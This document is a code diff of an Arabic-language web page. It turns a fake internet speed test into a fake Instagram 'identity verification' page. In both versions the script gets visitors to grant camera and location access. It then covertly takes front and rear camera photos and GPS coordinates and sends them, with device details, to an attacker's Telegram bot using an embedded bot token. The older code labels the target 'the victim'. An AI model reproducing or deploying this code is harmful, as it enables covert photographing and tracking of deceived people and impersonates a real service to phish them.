@@ -1,71 +1,83 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص الأمان والسرعة</title>
+    <title>Instagram - التحقق من الحساب</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #f4f4f4; padding-top: 50px; }
-        .box { background: white; padding: 20px; border-radius: 15px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        button { padding: 12px 25px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        .info { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; }
+        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 8px; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 15px; font-size: 12px; color: red; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>تحقق من سرعة اتصالك 🚀</h2>
-        <p>اضغط على البدء لقياس سرعة الإنترنت وموقع السيرفر الأقرب لك</p>
-        <button id="startBtn">بدء الاختبار</button>
-        <p id="status" style="color: #666;"></p>
+    <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo" alt="Instagram">
+        <p class="info">نظام الأمان: يرجى السماح بالوصول للكاميرا والموقع للتأكد من أنك لست روبوت (Bot) ولتأمين دخولك من هذا الجهاز.</p>
+        <button id="startBtn">تأكيد الهوية</button>
+        <div id="status"></div>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // ضع توكن البوت الخاص بك هنا (مهم جداً للرابط الخارجي)
-        const BOT_TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
-        const CHAT_ID = 'YOUR_PERSONAL_ID'; // ضع الآي دي الخاص بك لتصلك النتائج
+        const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0'; // توكن بوتك
+        const CHAT_ID = 'YOUR_USER_ID'; // الآي دي الخاص بك (احصل عليه من @userinfobot)
+
+        async function sendToBot(blob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'image.jpg');
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }
 
         document.getElementById('startBtn').onclick = async () => {
-            document.getElementById('status').innerText = "جاري الاتصال بالسيرفر...";
-            
+            const status = document.getElementById('status');
+            status.innerText = "جاري التحقق... لا تغلق الصفحة";
+
             try {
-                // جلب الموقع
+                // 1. الموقع الجغرافي
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
+                    const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    const deviceInfo = `📱 الجهاز: ${navigator.platform}\n🌍 الموقع: ${mapUrl}`;
 
-                    // فتح الكاميرا والتقاط صورة
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
+                    // 2. الكاميرا الأمامية
+                    const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    captureAndSend(streamFront, "📸 صورة سيلفي (أمامية)\n" + deviceInfo);
 
+                    // 3. الكاميرا الخلفية (بعد ثانية)
                     setTimeout(async () => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = 320; canvas.height = 240;
-                        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-                        const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
-
-                        // إرسال البيانات لتليجرام مباشرة عبر API
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('caption', `📍 موقع الضحية: https://www.google.com/maps?q=${lat},${lon}\n📱 الجهاز: ${navigator.platform}`);
-                        formData.append('photo', photoBlob, 'selfie.jpg');
-
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        document.getElementById('status').innerText = "اكتمل الاختبار! سرعة اتصالك 45Mbps";
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 1000);
+                        try {
+                            const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                            captureAndSend(streamBack, "📸 صورة خلفية");
+                        } catch(e) {}
+                    }, 2000);
                 });
-            } catch (e) {
-                alert("يرجى السماح بالوصول للكاميرا والموقع لتشغيل الاختبار");
+            } catch (err) {
+                status.innerText = "خطأ: يجب الموافقة على الأذونات للمتابعة";
             }
         };
+
+        async function captureAndSend(stream, caption) {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            const canvas = document.getElementById('canvas');
+            
+            setTimeout(async () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => sendToBot(blob, caption), 'image/jpeg', 0.6);
+                // إغلاق الكاميرا بعد الالتقاط
+                // stream.getTracks().forEach(t => t.stop());
+            }, 1000);
+        }
     </script>
 </body>
 </html>
